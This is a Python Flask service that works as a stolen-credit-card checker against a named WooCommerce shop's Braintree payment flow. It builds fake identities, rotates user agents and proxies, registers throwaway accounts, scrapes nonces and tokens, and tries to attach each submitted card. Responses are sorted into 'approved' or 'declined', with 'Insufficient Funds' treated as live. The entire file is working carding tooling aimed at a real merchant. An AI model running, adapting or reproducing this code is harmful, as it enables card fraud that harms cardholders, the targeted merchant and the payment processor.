from flask import Flask, request, jsonify
import requests
import base64
import json
import random
import secrets
from faker import Faker
from fake_useragent import UserAgent
from faker.providers.phone_number import Provider

app = Flask(__name__)

class IndiaPhoneNumberProvider(Provider):
    def india_phone_number(self):
        return self.msisdn()[3:]

def generate_phone():
    fake = Faker()
    fake.add_provider(IndiaPhoneNumberProvider)
    return fake.india_phone_number()

def check_card(card, proxy):
    try:
        correlationid = secrets.token_hex(16)
        r = requests.session()
        
        # Setup proxy - handle format: host:port:user:pass
        proxies = None
        if proxy:
            parts = proxy.split(':')
            if len(parts) >= 2:
                host = parts[0]
                port = parts[1]
                if len(parts) >= 4:
                    # Format: host:port:user:pass
                    user = parts[2]
                    pwd = ':'.join(parts[3:])  # Join remaining parts as password may contain :
                    proxy_url = f'http://{user}:{pwd}@{host}:{port}'
                else:
                    # Format: host:port
                    proxy_url = f'http://{host}:{port}'
                
                proxies = {
                    'http': proxy_url,
                    'https': proxy_url
                }
        
        phone = generate_phone()
        fake = Faker()
        nm = fake.name().split(' ')
        first = nm[0]
        last = nm[1] if len(nm) > 1 else 'Doe'
        ua = UserAgent()
        random_ua = ua.random
        
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        my_ip = ip_data['ip']
        
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'error', 'message': 'Invalid card format'}
        
        cc = parts[0]
        exp = parts[1]
        exy = parts[2]
        cvv = parts[3].replace('\n', '')
        
        # Reject Amex and Discover
        if cc[0] == '3' or cc[0] == '6':
            return {'status': 'declined', 'message': 'Card Type Rejected ❌'}
        
        # Normalize year
        try:
            exy = exy[2] + exy[3]
        except:
            pass
        
        bin_num = cc[:6]
        em = "".join(random.choice('qwertyuiopasdfghjklzxcvbnm') for b in range(7))
        
        # Step 1: Get register nonce
        url = "https://www.fantinipelletteria.com/my-account/add-payment-method/"
        headers = {
            'User-Agent': random_ua,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'cache-control': "max-age=0",
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': "1",
            'origin': "https://www.fantinipelletteria.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
        }
        
        response = r.get(url, headers=headers, proxies=proxies)
        rg = response.text.split('woocommerce-register-nonce" value=')[1].split('"')[1]
        
        # Step 2: Register
        payload = {
            'email': f"{em}@hotmail.com",
            'password': f"AnA#{em}",
            'woocommerce-register-nonce': rg,
            '_wp_http_referer': "/my-account/add-payment-method/",
            'register': "Register"
        }
        
        response = r.post(url, data=payload, headers=headers, proxies=proxies)
        
        # Step 3: Get billing nonce
        url = "https://www.fantinipelletteria.com/my-account/edit-address/billing/"
        response = r.get(url, headers=headers, cookies=r.cookies, proxies=proxies)
        nonce1 = response.text.split('name="woocommerce-edit-address-nonce" value=')[1].split('"')[1]
        
        # Step 4: Update billing
        payload = {
            'billing_country': "US",
            'billing_first_name': first,
            'billing_last_name': last,
            'billing_address_1': "new york",
            'billing_address_2': "",
            'billing_city': "new york",
            'billing_state': "NY",
            'billing_postcode': "10090",
            'billing_phone': phone,
            'billing_email': f"{em}@gmail.com",
            'save_address': "Save address",
            'woocommerce-edit-address-nonce': nonce1,
            '_wp_http_referer': "/my-account/edit-address/billing/",
            'action': "edit_address"
        }
        
        response = r.post(url, data=payload, headers=headers, cookies=r.cookies, proxies=proxies)
        
        # Step 5: Get payment nonce and Braintree token
        url = "https://www.fantinipelletteria.com/my-account/add-payment-method/"
        response = r.get(url, headers=headers, cookies=r.cookies, proxies=proxies)
        nonce = response.text.split('name="woocommerce-add-payment-method-nonce" value=')[1].split('"')[1]
        aut = response.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
        
        base4 = str(base64.b64decode(aut))
        auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]
        
        # Step 6: Get Braintree config
        url = "https://payments.braintree-api.com/graphql"
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "6df73aa4-2fce-43eb-ba62-36f746cb4ea9"
            },
            "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
            "operationName": "ClientConfiguration"
        }
        
        headers = {
            'User-Agent': random_ua,
            'Content-Type': "application/json",
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': "?1",
            'authorization': "Bearer " + auth,
            'braintree-version': "2018-05-10",
            'sec-ch-ua-platform': '"Android"',
            'origin': "https://www.fantinipelletteria.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.fantinipelletteria.com/",
            'accept-language': "en-US,en;q=0.9,ar;q=0.8"
        }
        
        response = requests.post(url, data=json.dumps(payload), headers=headers, proxies=proxies)
        googleauth = response.text.split('"cardinalAuthenticationJWT":')[1].split('"')[1]
        clb = response.text.split('"braintreeClientId":')[1].split('"')[1]
        clid = response.text.split('"clientId":')[1].split('"')[1]
        merchantId = response.text.split('"merchantId":')[1].split('"')[1]
        
        # Step 7: Tokenize card
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "6df73aa4-2fce-43eb-ba62-36f746cb4ea9"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": exp,
                        "expirationYear": exy,
                        "cvv": cvv,
                        "billingAddress": {
                            "postalCode": "10090",
                            "streetAddress": "new york"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': "?1",
            'authorization': "Bearer " + auth,
            'braintree-version': "2018-05-10",
            'sec-ch-ua-platform': '"Android"',
            'origin': "https://assets.braintreegateway.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://assets.braintreegateway.com/",
            'accept-language': "en-US,en;q=0.9,ar;q=0.8"
        }
        
        response = r.post(url, data=json.dumps(payload), headers=headers, proxies=proxies)
        tok = response.json()['data']['tokenizeCreditCard']['token']
        
        # Step 8: 3DS lookup
        url = f"https://api.braintreegateway.com/merchants/{merchantId}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
        payload = {
            "amount": "0.00",
            "browserColorDepth": 24,
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-US",
            "browserScreenHeight": 854,
            "browserScreenWidth": 384,
            "browserTimeZone": -180,
            "deviceChannel": "Browser",
            "additionalInfo": {
                "ipAddress": my_ip,
                "billingLine1": "new york",
                "billingLine2": "",
                "billingCity": "new york",
                "billingState": "NY",
                "billingPostalCode": "10090",
                "billingCountryCode": "US",
                "billingPhoneNumber": phone,
                "billingGivenName": first,
                "billingSurname": last,
                "email": f"{em}@gmail.com"
            },
            "bin": bin_num,
            "dfReferenceId": "",
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.123.1",
                "cardinalDeviceDataCollectionTimeElapsed": 1163,
                "issuerDeviceDataCollectionTimeElapsed": 3211,
                "issuerDeviceDataCollectionResult": True
            },
            "authorizationFingerprint": auth,
            "braintreeLibraryVersion": "braintree/web/3.123.1",
            "_meta": {
                "merchantAppId": "www.fantinipelletteria.com",
                "platform": "web",
                "sdkVersion": "3.123.1",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": "6df73aa4-2fce-43eb-ba62-36f746cb4ea9"
            }
        }
        
        headers = {
            'User-Agent': random_ua,
            'Content-Type': "application/json",
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': "?1",
            'origin': "https://www.fantinipelletteria.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.fantinipelletteria.com/",
            'accept-language': "en-US,en;q=0.9,ar;q=0.8"
        }
        
        response = r.post(url, data=json.dumps(payload), headers=headers, proxies=proxies)
        noncecc = response.json()['paymentMethod']['nonce']
        
        # Step 9: Add payment method
        url = "https://www.fantinipelletteria.com/my-account/add-payment-method/"
        config_data = f'{{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/{merchantId}/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{{"url":"https://client-analytics.braintreegateway.com/{merchantId}"}},"merchantId":"{merchantId}","venmo":"off","graphQL":{{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}},"challenges":["cvv"],"creditCards":{{"supportedCardTypes":["Maestro","UK Maestro","MasterCard","Visa"]}},"threeDSecureEnabled":true,"threeDSecure":{{"cardinalAuthenticationJWT":"{googleauth}","cardinalSongbirdUrl":"https://songbird.cardinalcommerce.com/edge/v1/songbird.js","cardinalSongbirdIdentityHash":null}},"paypalEnabled":true,"paypal":{{"displayName":"Fantini Pelletteria","clientId":"{clid}","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"{clb}","billingAgreementsEnabled":true,"merchantAccountId":"fantinipelletteriaukUSD","payeeEmail":null,"currencyIsoCode":"USD"}}}}'
        
        payload = {
            'payment_method': "braintree_cc",
            'braintree_cc_nonce_key': noncecc,
            'braintree_cc_device_data': f'{{"correlation_id":"{correlationid}"}}',
            'braintree_cc_3ds_nonce_key': "",
            'braintree_cc_config_data': config_data,
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': "/my-account/add-payment-method/",
            'woocommerce_add_payment_method': "1"
        }
        
        headers = {
            'User-Agent': random_ua,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'cache-control': "max-age=0",
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': "1",
            'origin': "https://www.fantinipelletteria.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
        }
        
        response = r.post(url, data=payload, headers=headers, cookies=r.cookies, proxies=proxies)
        
        try:
            msg = response.text.split('There was an error saving your payment method. Reason:')[1].split('<')[0] + " ❌"
            if 'Insufficient Funds' in msg:
                msg = 'Insufficient Funds ✅'
                status = 'approved'
            else:
                status = 'declined'
        except:
            msg = "APPROVED ✅"
            status = 'approved'
        
        return {
            'status': status,
            'message': msg,
            'response': msg,
            'card': card,
            'gateway': 'Braintree B3 1'
        }
        
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'card': card
        }

@app.route('/check', methods=['GET', 'POST'])
def check():
    if request.method == 'GET':
        card = request.args.get('cc', '')
        proxy = request.args.get('proxy', '')
    else:
        data = request.get_json()
        card = data.get('cc', '')
        proxy = data.get('proxy', '')
    
    if not card:
        return jsonify({'status': 'error', 'message': 'Missing cc parameter'})
    
    result = check_card(card, proxy)
    return jsonify(result)

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        'service': 'Braintree Auth API',
        'version': 'B3 1',
        'usage': '/check?cc=CARD&proxy=PROXY',
        'status': 'online'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
